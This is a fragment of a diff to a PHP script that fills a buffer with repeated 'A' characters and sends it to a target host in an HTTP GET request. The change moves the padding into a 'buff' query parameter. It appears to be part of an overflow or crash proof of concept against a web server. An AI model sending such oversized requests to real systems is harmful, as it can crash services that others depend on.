@@ -10,7 +10,7 @@ for($x=0;$x<$buffer;$x++) {
     $packet.="A";
 }
 
-$headers="GET /$packet HTTP/1.1\r\n";
+$headers="GET /?buff=$packet HTTP/1.1\r\n";
 $headers.="Host: $host\r\n";
 $headers.="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\n";
 $headers.="Content-Type: text/plain;charset=UTF-8\r\n";
